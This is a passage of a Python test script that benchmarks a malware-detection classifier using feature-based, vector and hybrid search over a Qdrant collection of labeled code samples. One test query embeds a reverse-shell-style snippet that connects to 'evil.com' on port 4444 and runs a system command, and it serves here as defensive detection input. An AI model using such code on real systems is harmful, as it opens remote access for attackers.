            query=query_vector.tolist(),
            limit=5
        ).points

        # Majority vote from top 3
        top_labels = [r.payload['label'] for r in results[:3]]
        prediction = max(set(top_labels), key=top_labels.count)

        predictions.append(prediction)
        ground_truth.append(query['expected_label'])

        print(f"\n  Query: {query['description']}")
        print(f"    Expected: {query['expected_label']}")
        print(f"    Predicted: {prediction}")
        print(f"    Top 3 results: {top_labels}")
        print(f"    {'✅' if prediction == query['expected_label'] else '❌'}")

    accuracy = sum(1 for p, g in zip(predictions, ground_truth) if p == g) / len(predictions)
    print(f"\n  Accuracy: {accuracy:.1%} ({sum(1 for p, g in zip(predictions, ground_truth) if p == g)}/{len(predictions)})")

    print("\n✅ Vector search test complete!")
    return accuracy


def test_hybrid_search(client, collection, embedding_components):
    """Test hybrid search (vectors + features)."""
    print_separator("TEST: Hybrid Search (Vectors + Features)")

    tokenizer, model, device = embedding_components

    print("\nStrategy: Vector search + feature-based reranking")
    print("  1. Find top 10 similar samples (vector search)")
    print("  2. Rerank by feature similarity")
    print("  3. Take top 3 for majority vote")

    test_query = {
        "code": "import socket\nimport os\ns = socket.socket()\ns.connect(('evil.com', 4444))\nos.system('whoami')",
        "expected_label": "malicious",
        "description": "Reverse shell with command execution"
    }

    # Extract query features
    query_features = extract_features_for_sample(test_query['code'])

    # Embed query with UniXcoder
    with torch.no_grad():
        inputs = tokenizer([test_query['code']], padding=True, truncation=True, max_length=512, return_tensors="pt")
        inputs = {k: v.to(device) for k, v in inputs.items()}
        outputs = model(**inputs)
        query_vector = outputs.last_hidden_state.mean(dim=1).cpu().numpy()[0]

    # 1. Vector search (top 10)
    vector_results = client.query_points(
        collection_name=collection,
        query=query_vector.tolist(),
        limit=10
    ).points

    print(f"\n  Vector search found {len(vector_results)} candidates")

    # 2. Feature-based reranking
    reranked = []
    for result in vector_results:
        features = result.payload['features']
        vector_score = result.score
        feature_similarity = calculate_feature_similarity(query_features, features)

        # Hybrid score: 60% vector + 40% features
        hybrid_score = 0.6 * vector_score + 0.4 * feature_similarity

        reranked.append({
            'payload': result.payload,
            'vector_score': vector_score,
            'feature_score': feature_similarity,
            'hybrid_score': hybrid_score
        })

    reranked.sort(key=lambda x: x['hybrid_score'], reverse=True)

    # 3. Majority vote from top 3
    top_labels = [r['payload']['label'] for r in reranked[:3]]
    prediction = max(set(top_labels), key=top_labels.count)

    print(f"\n  Top 3 after hybrid ranking:")
    for idx, r in enumerate(reranked[:3], 1):
        payload = r['payload']
        print(f"    [{idx}] {payload['category']:20s} | Label: {payload['label']}")
        print(f"        Vector: {r['vector_score']:.3f} | Features: {r['feature_score']:.3f} | Hybrid: {r['hybrid_score']:.3f}")

    print(f"\n  Expected: {test_query['expected_label']}")
    print(f"  Predicted: {prediction}")
    print(f"  {'✅ CORRECT' if prediction == test_query['expected_label'] else '❌ WRONG'}")

    print("\n✅ Hybrid search test complete!")
    return prediction == test_query['expected_label']


def main():
    """Run balanced test."""
    print_separator("BALANCED HYBRID SEARCH TEST")
    print("\n40 samples: 20 benign + 20 malicious (50/50 split)")

    # Connect
    api_key = os.getenv("QDRANT_API_KEY")
    client_kwargs = {"host": "localhost", "port": 6333, "https": False, "timeout": 60}
    if api_key:
        client_kwargs["api_key"] = api_key

    client = QdrantClient(**client_kwargs)
    print("✓ Connected to Qdrant")

    try:
        # Setup with REAL embeddings (UniXcoder)
        collection, embedding_components = setup_balanced_collection(client, use_real_embeddings=True)

        # Test 1: Feature-only (baseline)
        print("\n")
        metrics_features = test_feature_based_classification(client, collection)

        # Test 2: Vector-only search
        print("\n")
        vector_accuracy = test_vector_based_search(client, collection, embedding_components)

        # Test 3: Hybrid search
        print("\n")
        hybrid_correct = test_hybrid_search(client, collection, embedding_components)

        # Final comparison
        print_separator("FINAL COMPARISON")
        print(f"\n{'Approach':<25} {'Recall':<15} {'Precision':<15} {'F1':<15} {'FPR':<15}")
        print("-" * 85)
        print(f"{'Feature-only':<25} {metrics_features['recall']:<15.2%} {metrics_features['precision']:<15.2%} {metrics_features['f1']:<15.2%} {metrics_features['fpr']:<15.2%}")
        print(f"{'Vector-only':<25} {'N/A':<15} {'N/A':<15} {'N/A':<15} {'N/A':<15}")
        print(f"{'Hybrid (60% vec + 40% feat)':<25} {'✅' if hybrid_correct else '❌':<15} {'N/A':<15} {'N/A':<15} {'N/A':<15}")

        print("\n" + "="*85)
        print("RESULTS:")
        print(f"  Feature-only: {metrics_features['recall']:.0%} recall (baseline)")
        print(f"  Vector search: {vector_accuracy:.0%} accuracy on 3 test queries")
        print(f"  Hybrid: {'✅ Correct' if hybrid_correct else '❌ Wrong'} on reverse shell query")
        print("\n✨ Component 2 (Static Features) + Vector Search Validated!")

        return 0

    except Exception as e:
        print(f"\n❌ TEST FAILED: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
